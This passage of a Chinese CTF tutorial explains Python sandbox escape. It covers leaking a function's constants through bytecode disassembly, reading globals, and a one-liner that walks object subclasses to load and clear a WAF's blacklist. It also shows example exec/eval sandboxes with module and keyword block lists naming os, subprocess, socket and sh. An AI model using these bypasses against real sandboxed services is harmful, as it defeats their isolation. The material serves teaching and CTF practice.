<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__globals__</span><br><span class="line"></span><br><span class="line">get_flag.__globals__</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.__code__.co_varnames</span><br><span class="line">(<span class="string">&#x27;some_input&#x27;</span>, <span class="string">&#x27;var1&#x27;</span>, <span class="string">&#x27;var2&#x27;</span>, <span class="string">&#x27;var3&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="获取函数字节码序列"><a href="#获取函数字节码序列" class="headerlink" title="获取函数字节码序列"></a>获取函数字节码序列</h3><p>get_flag 函数的 <code>.__code__.co_code</code>, 可以获取到函数的字节码序列:</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.__code__.co_code</span><br><span class="line"><span class="string">b&#x27;\x97\x00d\x01&#125;\x01d\x02&#125;\x02d\x03d\x04g\x02&#125;\x03|\x00|\x02k\x02\x00\x00\x00\x00r\x02d\x05S\x00d\x06S\x00&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>字节码并不包含源代码的完整信息，如变量名、注释等。但可以使用 dis 模块来反汇编字节码并获取大致的源代码.</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytecode = get_flag.__code__.co_code</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dis.dis(bytecode)</span><br><span class="line">          <span class="number">0</span> RESUME                   <span class="number">0</span></span><br><span class="line">          <span class="number">2</span> LOAD_CONST               <span class="number">1</span></span><br><span class="line">          <span class="number">4</span> STORE_FAST               <span class="number">1</span></span><br><span class="line">          <span class="number">6</span> LOAD_CONST               <span class="number">2</span></span><br><span class="line">          <span class="number">8</span> STORE_FAST               <span class="number">2</span></span><br><span class="line">         <span class="number">10</span> LOAD_CONST               <span class="number">3</span></span><br><span class="line">         <span class="number">12</span> LOAD_CONST               <span class="number">4</span></span><br><span class="line">         <span class="number">14</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">         <span class="number">16</span> STORE_FAST               <span class="number">3</span></span><br><span class="line">         <span class="number">18</span> LOAD_FAST                <span class="number">0</span></span><br><span class="line">         <span class="number">20</span> LOAD_FAST                <span class="number">2</span></span><br><span class="line">         <span class="number">22</span> COMPARE_OP               <span class="number">2</span> (==)</span><br><span class="line">         <span class="number">28</span> POP_JUMP_FORWARD_IF_FALSE     <span class="number">2</span> (to <span class="number">34</span>)</span><br><span class="line">         <span class="number">30</span> LOAD_CONST               <span class="number">5</span></span><br><span class="line">         <span class="number">32</span> RETURN_VALUE</span><br><span class="line">    &gt;&gt;   <span class="number">34</span> LOAD_CONST               <span class="number">6</span></span><br><span class="line">         <span class="number">36</span> RETURN_VALUE</span><br></pre></td></tr></table></figure></div>

<p>虽然能获取但不太方便看,如果能够获取 <code>__code__</code> 对象,也可以通过 <code>dis.disassemble</code> 获取更清晰的表示.</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytecode = get_flag.__code__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dis.disassemble(bytecode)</span><br><span class="line">  <span class="number">1</span>           <span class="number">0</span> RESUME                   <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="number">2</span>           <span class="number">2</span> LOAD_CONST               <span class="number">1</span> (<span class="number">1</span>)</span><br><span class="line">              <span class="number">4</span> STORE_FAST               <span class="number">1</span> (var1)</span><br><span class="line"></span><br><span class="line">  <span class="number">3</span>           <span class="number">6</span> LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;secretcode&#x27;</span>)</span><br><span class="line">              <span class="number">8</span> STORE_FAST               <span class="number">2</span> (var2)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>          <span class="number">10</span> LOAD_CONST               <span class="number">3</span> (<span class="string">&#x27;some&#x27;</span>)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">4</span> (<span class="string">&#x27;array&#x27;</span>)</span><br><span class="line">             <span class="number">14</span> BUILD_LIST               <span class="number">2</span></span><br><span class="line">             <span class="number">16</span> STORE_FAST               <span class="number">3</span> (var3)</span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>          <span class="number">18</span> LOAD_FAST                <span class="number">0</span> (some_input)</span><br><span class="line">             <span class="number">20</span> LOAD_FAST                <span class="number">2</span> (var2)</span><br><span class="line">             <span class="number">22</span> COMPARE_OP               <span class="number">2</span> (==)</span><br><span class="line">             <span class="number">28</span> POP_JUMP_FORWARD_IF_FALSE     <span class="number">2</span> (to <span class="number">34</span>)</span><br><span class="line"></span><br><span class="line">  <span class="number">6</span>          <span class="number">30</span> LOAD_CONST               <span class="number">5</span> (<span class="string">&#x27;THIS-IS-THE-FALG!&#x27;</span>)</span><br><span class="line">             <span class="number">32</span> RETURN_VALUE</span><br><span class="line"></span><br><span class="line">  <span class="number">8</span>     &gt;&gt;   <span class="number">34</span> LOAD_CONST               <span class="number">6</span> (<span class="string">&#x27;Nope&#x27;</span>)</span><br><span class="line">             <span class="number">36</span> RETURN_VALUE</span><br></pre></td></tr></table></figure></div>

<h2 id="获取环境信息"><a href="#获取环境信息" class="headerlink" title="获取环境信息"></a>获取环境信息</h2><h3 id="获取-python-版本"><a href="#获取-python-版本" class="headerlink" title="获取 python 版本"></a>获取 python 版本</h3><h4 id="sys-模块"><a href="#sys-模块" class="headerlink" title="sys 模块"></a>sys 模块</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.version</span><br></pre></td></tr></table></figure></div>

<h4 id="platform-模块-1"><a href="#platform-模块-1" class="headerlink" title="platform 模块"></a>platform 模块</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.python_version()</span><br></pre></td></tr></table></figure></div>

<h3 id="获取-linux-版本"><a href="#获取-linux-版本" class="headerlink" title="获取 linux 版本"></a>获取 linux 版本</h3><h4 id="platform-模块-2"><a href="#platform-模块-2" class="headerlink" title="platform 模块"></a>platform 模块</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.uname()</span><br></pre></td></tr></table></figure></div>

<h3 id="获取路径"><a href="#获取路径" class="headerlink" title="获取路径"></a>获取路径</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys.path</span><br><span class="line">sys.modules</span><br></pre></td></tr></table></figure></div>

<h2 id="获取全局变量"><a href="#获取全局变量" class="headerlink" title="获取全局变量"></a>获取全局变量</h2><h3 id="globals-函数"><a href="#globals-函数" class="headerlink" title="globals 函数"></a>globals 函数</h3><p>globals 函数可以获取所有的全局变量。</p>
<h3 id="help-函数"><a href="#help-函数" class="headerlink" title="help 函数"></a>help 函数</h3><p>help 函数也可以获取某个模块的帮助信息，包括全局变量, 输入 <code>__main__</code> 之后可以获取当前模块的信息。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>&gt; __main__</span><br></pre></td></tr></table></figure></div>

<p>相比 globals() 而言 help() 更短，在一些限制长度的题目中有利用过这个点。</p>
<h3 id="vars-函数"><a href="#vars-函数" class="headerlink" title="vars 函数"></a>vars 函数</h3><p>vars() 函数返回该对象的命名空间（namespace）中的所有属性以字典的形式表示。当前模块的所有变量也会包含在里面，一些过滤链 globals 和 help 函数的场景可以尝试使用 vars()</p>
<h2 id="获取模块内部函数或变量"><a href="#获取模块内部函数或变量" class="headerlink" title="获取模块内部函数或变量"></a>获取模块内部函数或变量</h2><h3 id="获取指定模块内部变量"><a href="#获取指定模块内部变量" class="headerlink" title="获取指定模块内部变量"></a>获取指定模块内部变量</h3><p>获取模块内部函数或变量的目的主要是为了信息泄露或篡改。比如 waf.py 中存在某个变量定义了危险字符列表，我们可以考虑先获取这个变量然后将其清空。</p>
<p>可以先获取 load_module，然后通过 load_module 导入特定的模块，进而篡改其中变量。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>(().__class__.__bases__.__iter__().__next__().__subclasses__().__getitem__(<span class="number">84</span>).load_module(<span class="string">&quot;waf&quot;</span>).__dict__.values()).__getitem__(<span class="number">8</span>).clear()</span><br></pre></td></tr></table></figure></div>

<h3 id="获取-main-中变量"><a href="#获取-main-中变量" class="headerlink" title="获取 __main__ 中变量"></a>获取 <code>__main__</code> 中变量</h3><p>例如获取 <code>__main__</code></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<h3 id="获取命令空间中的变量-模块-函数等"><a href="#获取命令空间中的变量-模块-函数等" class="headerlink" title="获取命令空间中的变量&#x2F;模块&#x2F;函数等"></a>获取命令空间中的变量&#x2F;模块&#x2F;函数等</h3><p><code>__globals__</code>是一个特殊属性，能够以 dict 的形式返回<strong>函数</strong>（注意是函数）所在模块命名空间的所有变量，其中包含了很多已经引入的 modules。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;request&#x27;</span>]</span><br><span class="line">url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br></pre></td></tr></table></figure></div>

<h1 id="常见沙箱"><a href="#常见沙箱" class="headerlink" title="常见沙箱"></a>常见沙箱</h1><h2 id="exec-执行"><a href="#exec-执行" class="headerlink" title="exec 执行"></a>exec 执行</h2><p>Python 的 <code>exec()</code> 是一个内建函数，用来执行动态生成的 Python 代码。也就是说，<code>exec()</code> 可以执行储存在字符串或对象中的 Python 代码。这是 <code>exec()</code> 的基本语法：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="built_in">object</span>, <span class="built_in">globals</span>, <span class="built_in">locals</span>)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>object</code> 必需参数，是一个字符串，或者是任何可以被 <code>compile()</code> 函数转化为代码对象的对象。</li>
<li><code>globals</code> 可选参数，是一个字典，表示全局命名空间 (全局变量)，如果提供了，则在执行代码中被用作全局命名空间。</li>
<li><code>locals</code> 可选参数，可以是任何映射对象，表示局部命名空间 (局部变量)，如果被提供，则在执行代码中被用作局部命名空间。如果两者都被忽略，那么在 <code>exec()</code> 调用的地方决定执行的命名空间。</li>
</ul>
<p>默认情况下，<code>exec</code> 使用调用处的全局&#x2F;局部环境，但如果传入自己的 <code>globals</code> &#x2F; <code>locals</code>，可以<strong>人为隔离环境</strong>。</p>
<p>exec 在 Python2 还有另外一种写法：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>, _local</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>command</code> → 要执行的 Python 代码（字符串 &#x2F; 代码对象）</li>
<li><code>_global</code> → 全局作用域字典</li>
<li><code>_local</code> → 局部作用域（可省略，省略时 <code>_global</code> 同时用作局部作用域）</li>
</ul>
<p>示例沙箱</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    <span class="built_in">exec</span>(</span><br><span class="line">        <span class="built_in">input</span>(<span class="string">&quot;code&gt; &quot;</span>), </span><br><span class="line">        &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,   <span class="comment"># 全局禁用 builtins</span></span><br><span class="line">        &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;    <span class="comment"># 局部也禁用 builtins</span></span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>这种沙箱思路：</p>
<ul>
<li>用空字典替换 <code>__builtins__</code>，试图让执行环境没有内置函数&#x2F;类（<code>open</code>、<code>eval</code>、<code>exec</code>、<code>__import__</code> 等）。</li>
<li>同时限制全局和局部命名空间。</li>
</ul>
<p>有时候 <code>__builtins__</code> 还会被替换为修改过的 <code>__builtins__</code>，其中特殊函数例如 <code>__import__</code> 会被添加 Hook，并且删除其中部分函数。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 指定 Python2 解释器 &amp; UTF-8 编码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印横幅</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;=============================================&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;   Simple calculator implemented by python   &quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;=============================================&quot;</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取用户输入</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getexp</span>():</span><br><span class="line">    <span class="keyword">return</span> raw_input(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义 import 钩子</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span><br><span class="line">    <span class="comment"># 禁止导入的模块黑名单</span></span><br><span class="line">    module_blacklist = [</span><br><span class="line">        <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:  <span class="comment"># 如果要导入的模块在黑名单中</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># 否则正常导入</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单的命令黑名单检测</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_filter</span>(<span class="params">command</span>):</span><br><span class="line">    blacklist = [</span><br><span class="line">        <span class="string">&#x27;exec&#x27;</span>,        <span class="comment"># 禁止 exec</span></span><br><span class="line">        <span class="string">&#x27;sh&#x27;</span>,          <span class="comment"># 禁止出现 sh（防 shell 调用）</span></span><br><span class="line">        <span class="string">&#x27;__getitem__&#x27;</span>, <span class="comment"># 禁止通过下标访问绕过</span></span><br><span class="line">        <span class="string">&#x27;__setitem__&#x27;</span>, <span class="comment"># 禁止通过下标赋值绕过</span></span><br><span class="line">        <span class="string">&#x27;=&#x27;</span>,           <span class="comment"># 禁止赋值语句</span></span><br><span class="line">        <span class="string">&#x27;open&#x27;</span>,        <span class="comment"># 禁止 open 打开文件</span></span><br><span class="line">        <span class="string">&#x27;read&#x27;</span>,        <span class="comment"># 禁止 read 读取文件</span></span><br><span class="line">        <span class="string">&#x27;sys&#x27;</span>,         <span class="comment"># 禁止 sys 模块</span></span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>,           <span class="comment"># 禁止多条命令</span></span><br><span class="line">        <span class="string">&#x27;os&#x27;</span>           <span class="comment"># 禁止 os 模块</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> forbid <span class="keyword">in</span> command:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>   <span class="comment"># 命中关键字 → 不允许执行</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>            <span class="comment"># 通过检测</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 沙箱执行函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_exec</span>(<span class="params">command</span>):</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 复制一份 __builtins__（这是 Python 的内置函数和变量集合）</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    <span class="comment"># 用 _hook_import_ 替换内置 __import__（加黑名单检查）</span></span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_</span><br><span class="line">    <span class="comment"># 删除 open 函数（防止直接打开文件）</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置全局命名空间（只能使用我们给的内置函数）</span></span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查用户输入是否包含黑名单关键字</span></span><br><span class="line">    <span class="keyword">if</span> sandbox_filter(command) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Malicious user input detected!!!&#x27;</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 把用户输入包装成一个赋值表达式（方便取结果）</span></span><br><span class="line">    command = <span class="string">&#x27;result = &#x27;</span> + command</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 在受限全局环境 _global 中执行代码</span></span><br><span class="line">        <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="comment"># 如果执行出错，打印错误信息</span></span><br><span class="line">        <span class="built_in">print</span> e</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 从全局字典中取出计算结果</span></span><br><span class="line">    result = _<span class="keyword">global</span>[<span class="string">&#x27;result&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行程序</span></span><br><span class="line">banner()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    command = getexp()           <span class="comment"># 获取输入</span></span><br><span class="line">    <span class="built_in">print</span> sandbox_exec(command)  <span class="comment"># 执行并打印结果</span></span><br></pre></td></tr></table></figure></div>



<h2 id="eval-执行"><a href="#eval-执行" class="headerlink" title="eval 执行"></a>eval 执行</h2><p>eval 的执行与 exec 基本一致，都可以对命名空间进行限制，例如下面的代码，在这个示例中就是直接将命名空间置空，这样就使得内置的函数都无法使用。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;code&gt; &quot;</span>), </span><br><span class="line">         &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;</span><br><span class="line">        )</span><br><span class="line">    )</span><br></pre></td></tr></table></figure></div>

<p>eval 与 exec 的区别再于 exec 允许 \n 和 ； 进行换行，而 eval 不允许。并且 exec 不会将结果输出出来，而 eval 会。如果加入了 compile 函数则需要按照 compile 函数的模式进行区分。</p>
<h2 id="基于-audit-hook-的沙箱"><a href="#基于-audit-hook-的沙箱" class="headerlink" title="基于 audit hook 的沙箱"></a>基于 audit hook 的沙箱</h2><p>Python 3.8 中引入的一种 audit hook 的新特性。审计钩子可以用来监控和记录 Python 程序在运行时的行为，特别是那些安全敏感的行为，如文件的读写、网络通信和动态代码的执行等。</p>
<p><code>sys.addaudithook(hook)</code> 的参数 <code>hook</code> 是一个函数，它的定义形式为 <code>hook(event: str, args: tuple)</code>。其中，<code>event</code> 是一个描述事件名称的字符串，<code>args</code> 是一个包含了与该事件相关的参数的元组。</p>
<p>一旦一个审计钩子被添加，那么在解释器运行时，每当发生一个与安全相关的事件，就会调用该审计钩子函数。<code>event</code> 参数会包含事件的描述，<code>args</code> 参数则包含了事件的相关信息。这样，审计钩子就可以根据这些信息进行审计记录或者对某些事件进行阻止。</p>
<p>注意，由于 <code>sys.addaudithook()</code> 主要是用于增加审计和安全性，一旦一个审计钩子被添加，它不能被移除。这是为了防止恶意代码移除审计钩子以逃避审计。</p>
<p>举例来说，我们可以定义这样的一个审计钩子，使得每次触发 <code>open</code> 事件都会打印一条消息：</p>
